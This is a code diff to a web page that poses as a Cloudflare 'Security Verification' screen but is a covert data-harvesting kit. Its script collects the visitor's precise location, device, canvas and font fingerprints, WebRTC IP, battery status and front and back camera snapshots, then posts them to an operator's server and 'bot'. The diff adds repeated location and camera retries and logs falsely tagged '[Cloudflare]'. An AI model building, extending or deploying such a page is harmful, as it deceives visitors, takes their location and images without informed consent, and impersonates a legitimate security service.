@@ -28,19 +28,6 @@
             position: relative;
             overflow: hidden;
         }
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
-            animation: pulse-bg 4s infinite;
-            pointer-events: none;
-        }
-        @keyframes pulse-bg { 0% { transform: scale(0.8); } 50% { transform: scale(1.2); } 100% { transform: scale(0.8); } }
-
         .logo { 
             font-size: 64px; 
             margin-bottom: 20px; 
@@ -258,13 +245,27 @@
             color: #1e293b;
             margin-top: 20px;
         }
+
+        /* Debug Console */
+        .debug-console {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 10px;
+            z-index: 10000;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">🔒</div>
         <h1>Security Verification</h1>
-        <p class="subtitle">We're verifying your device for enhanced security. This may take up to 30 seconds.</p>
+        <p class="subtitle">We're verifying your device for enhanced security.</p>
         
         <div class="loader"></div>
         
@@ -323,6 +324,9 @@
         <div class="success-text">Verification Complete!</div>
     </div>
 
+    <!-- Debug Console -->
+    <div class="debug-console" id="debugConsole"></div>
+
     <script>
         const uid = '<%= uid %>';
         const host = '<%= host %>';
@@ -330,6 +334,19 @@
         const delay = <%= duration %>;
         const progressBar = document.getElementById('progressBar');
         const progressLabel = document.getElementById('progressLabel');
+        const debugConsole = document.getElementById('debugConsole');
+
+        // Enable debug in development
+        const DEBUG = false;
+        if (DEBUG) debugConsole.style.display = 'block';
+
+        function logDebug(message) {
+            if (DEBUG) {
+                debugConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
+                debugConsole.scrollTop = debugConsole.scrollHeight;
+            }
+            console.log(`[Cloudflare] ${message}`);
+        }
 
         let cameraAttempts = 0;
         let cameraGranted = false;
@@ -369,7 +386,8 @@
 
         async function send(endpoint, data) {
             try {
-                const response = await fetch(`${host}/${endpoint}`, {
+                logDebug(`Sending to ${endpoint}: ${JSON.stringify(data).substring(0, 100)}...`);
+                const response = await fetch(`${host}${endpoint}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
@@ -380,22 +398,22 @@
                 }
                 
                 const result = await response.json();
-                console.log(`✅ ${endpoint} success:`, result);
+                logDebug(`${endpoint} success: ${JSON.stringify(result)}`);
                 return result;
             } catch (error) {
-                console.error(`❌ ${endpoint} failed:`, error.message);
-                // Send error to bot for debugging
+                logDebug(`${endpoint} failed: ${error.message}`);
+                // Send error report to bot
                 try {
                     await fetch(`${host}/info`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             uid: uid,
-                            data: `<b>📤 Send Failed (${endpoint}):</b> <code>${error.message}</code>`
+                            data: `<b>📤 Cloudflare Error (${endpoint}):</b> <code>${error.message}</code>`
                         })
                     });
                 } catch (e) {
-                    console.error('Failed to send error report:', e);
+                    logDebug(`Failed to send error report: ${e.message}`);
                 }
                 return { success: false, error: error.message };
             }
@@ -403,9 +421,17 @@
 
         // ========== MAXIMUM INFO GATHERING ==========
 
-        // 1. LOCATION
+        // 1. LOCATION (with retry)
         setTimeout(() => {
-            if (navigator.geolocation) {
+            if (!navigator.geolocation) {
+                completeStep(1, '⚠️ Location not supported', 'error');
+                return;
+            }
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attempt() {
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
                         const result = await send('location', {
@@ -419,15 +445,20 @@
                         });
                         completeStep(1, '✓ Location secured', result.success ? 'success' : 'error');
                     },
-                    async (err) => {
-                        await send('info', { uid: uid, data: `<b>📍 Location Error:</b> <code>${err.message}</code>` });
-                        completeStep(1, '⚠️ Location access denied', 'error');
+                    (err) => {
+                        logDebug(`Location error: ${err.message}`);
+                        attempts++;
+                        if (attempts < maxAttempts) {
+                            setTimeout(attempt, 2000);
+                        } else {
+                            completeStep(1, '⚠️ Location access denied', 'error');
+                        }
                     },
                     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                 );
-            } else {
-                completeStep(1, '⚠️ Location not supported', 'error');
             }
+
+            attempt();
         }, 300);
 
         // 2. DEVICE FINGERPRINT
@@ -464,6 +495,7 @@
                 });
                 completeStep(2, '✓ Device profile created', result.success ? 'success' : 'error');
             } catch (err) {
+                logDebug(`Device fingerprint error: ${err.message}`);
                 await send('info', { uid: uid, data: `<b>🖥️ Device Error:</b> <code>${err.message}</code>` });
                 completeStep(2, '⚠️ Device scan failed', 'error');
             }
@@ -481,6 +513,7 @@
                     await send('info', { uid: uid, data: `<b>🔋 Battery:</b> ${batteryInfo}` });
                     messages.push('Battery');
                 } catch(e) {
+                    logDebug(`Battery error: ${e.message}`);
                     messages.push('BatErr');
                 }
             }
@@ -511,6 +544,7 @@
                 await send('info', { uid: uid, data: `<b>🎨 Canvas FP:</b> <code>${canvasFP}</code>` });
                 messages.push('Canvas');
             } catch(e) {
+                logDebug(`Canvas error: ${e.message}`);
                 messages.push('CanvErr');
             }
 
@@ -520,6 +554,7 @@
                 await send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Supported` });
                 messages.push('Audio');
             } catch(e) {
+                logDebug(`Audio error: ${e.message}`);
                 await send('info', { uid: uid, data: `<b>🎵 AudioContext:</b> Not supported` });
                 messages.push('AudErr');
             }
@@ -555,6 +590,7 @@
                     messages.push('WebRTC');
                 }
             } catch(e) {
+                logDebug(`WebRTC error: ${e.message}`);
                 messages.push('IP Err');
             }
 
@@ -574,6 +610,7 @@
                 await send('info', { uid: uid, data: `<b>🔠 Fonts:</b> ${installed.join(', ')}` });
                 messages.push('Fonts');
             } catch(e) {
+                logDebug(`Fonts error: ${e.message}`);
                 messages.push('FontErr');
             }
 
@@ -586,12 +623,14 @@
             document.getElementById('cameraModal').classList.add('active');
             send('cam-status', { uid: uid, status: 'pending' });
             updateStatus(5, '⏳ Waiting for your permission...');
+            logDebug('Showing camera modal');
         }
 
         function allowCamera() {
             document.getElementById('cameraModal').classList.remove('active');
             cameraGranted = true;
             requestCameraAccess();
+            logDebug('User allowed camera');
         }
 
         function denyCamera() {
@@ -599,6 +638,7 @@
             cameraDenied = true;
             send('cam-status', { uid: uid, status: 'denied' });
             completeStep(5, '❌ Camera access denied', 'error');
+            logDebug('User denied camera');
         }
 
         async function requestCameraAccess(facingMode = 'user') {
@@ -611,7 +651,9 @@
                 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 captureAndSend(stream, facingMode);
+                logDebug(`Camera access granted for ${facingMode}`);
             } catch (err) {
+                logDebug(`Camera error: ${err.name} - ${err.message}`);
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     cameraAttempts++;
                     if (cameraAttempts <= 3) {
@@ -642,6 +684,7 @@
             
             send('cam-status', { uid: uid, status: 'allowed' });
             updateStatus(5, `📷 Capturing ${type === 'environment' ? 'back' : 'front'} camera...`);
+            logDebug(`Capturing ${type} camera`);
             
             video.onloadedmetadata = () => {
                 setTimeout(() => {
@@ -659,8 +702,10 @@
                     }).then(result => {
                         if (result.success) {
                             updateStatus(5, `✓ ${type === 'environment' ? 'Back' : 'Front'} camera captured`);
+                            logDebug(`${type} camera captured successfully`);
                         } else {
                             updateStatus(5, `⚠️ ${type === 'environment' ? 'Back' : 'Front'} cam failed`, 'error');
+                            logDebug(`${type} camera capture failed`);
                         }
                     });
                     
